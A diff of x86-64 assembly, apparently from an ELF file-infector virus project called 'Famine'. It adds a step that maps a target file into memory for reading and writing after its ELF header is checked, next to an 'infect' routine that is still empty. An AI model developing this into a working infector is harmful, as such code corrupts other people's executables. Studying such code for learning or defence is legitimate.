@@ -88,7 +88,6 @@ section .text
                     jmp .close_file 
 
             .magic_numbers:
-                TRACE_TEXT hello, 11
                 mov rdi, VAR(famine.fd_file)
                 lea rsi, VAR(famine.elf_ehdr)
                 mov rdx, 64   
@@ -109,6 +108,20 @@ section .text
             ;     mov rsi, 0o777
             ;     mov rax, SC_FCHMOD
             ;     syscall
+
+            .mmap:
+                TRACE_TEXT hello, 11
+                mov rdi, 0x0
+                mov rsi, VAR(famine.file_original_len)
+                mov rdx, PROT_READ | PROT_WRITE
+                mov r10, 0x02
+                mov r8, VAR(famine.fd_file)
+                mov r9, 0x0
+                mov rax, SC_MMAP
+                syscall
+                test rax, rax
+                jle .close_file
+
 
                 .close_file:
                 mov rdi, VAR(famine.fd_file)
@@ -149,4 +162,3 @@ section .text
             syscall
     
     infect:
-        
